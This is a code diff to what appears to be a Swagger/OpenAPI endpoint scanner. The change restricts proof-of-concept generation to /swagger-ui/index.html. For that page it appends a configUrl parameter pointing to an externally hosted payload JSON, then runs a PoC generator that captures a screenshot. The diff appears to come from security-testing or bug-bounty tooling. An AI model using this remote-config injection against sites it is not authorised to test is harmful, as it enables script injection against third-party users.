@@ -33,32 +33,44 @@ def test_endpoint(url, error_content, verbose, user_agent, poc_already_generated
             # Calculate similarity with the error content
             similarity = difflib.SequenceMatcher(None, error_content, response.text).ratio()
             if similarity < 0.90:
-                # Check for various Swagger/OpenAPI endpoints
+                # Extract the domain from the URL for use in the filename
+                from urllib.parse import urlparse
+                parsed_url = urlparse(url)
+                domain = parsed_url.netloc
+                
+                # Check if this is specifically /swagger-ui/index.html
+                is_swagger_ui_index = '/swagger-ui/index.html' in url
+                
+                # Check for other Swagger/OpenAPI endpoints (for reporting purposes)
                 swagger_patterns = ['/swagger-ui', '/api-docs', '/openapi', '/swagger.', '/swagger-resources']
                 is_swagger = any(pattern in url for pattern in swagger_patterns)
                 
-                # Only generate PoC if we haven't already generated one for this domain
-                # and this is a Swagger/OpenAPI endpoint
-                if is_swagger and not poc_already_generated:
+                # Only generate PoC if:
+                # 1. We haven't already generated one for this domain AND
+                # 2. This is specifically the /swagger-ui/index.html endpoint
+                if is_swagger_ui_index and not poc_already_generated:
                     print(f"Calling PoC generator for {url}")
                     current_dir = os.path.dirname(os.path.abspath(__file__))
                     pocgenerator_path = os.path.join(current_dir, 'pocgenerator.py')
                     
-                    # Extract the domain from the URL for use in the filename
-                    from urllib.parse import urlparse
-                    parsed_url = urlparse(url)
-                    domain = parsed_url.netloc
-                    
                     # Add configUrl parameter for Swagger UI endpoints
-                    endpoint_url = url
-                    if '/swagger-ui' in url:
-                        endpoint_url += "?configUrl=https://raw.githubusercontent.com/brinhosa/payloads/master/testswagger.json"
+                    endpoint_url = url + "?configUrl=https://raw.githubusercontent.com/brinhosa/payloads/master/testswagger.json"
                     
                     # Pass the SCREENSHOT_PATH environment variable if it exists
                     env = os.environ.copy()
                     # Add domain information to help with filename generation
                     env['DOMAIN'] = domain
-                    subprocess.run(['python3', pocgenerator_path, endpoint_url], env=env)
+                    # Add a flag to indicate this is a PoC generation
+                    env['GENERATE_POC'] = 'true'
+                    
+                    # Run the PoC generator and capture the result
+                    result = subprocess.run(['python3', pocgenerator_path, endpoint_url], env=env, capture_output=True, text=True)
+                    
+                    # Check if the screenshot was successfully created
+                    if 'Screenshot saved' in result.stdout:
+                        # Set a flag in the environment to indicate a successful screenshot
+                        os.environ[f'SCREENSHOT_CREATED_{domain.replace('.', '_')}'] = 'true'
+                
                 return url
     except requests.RequestException as e:
         pass
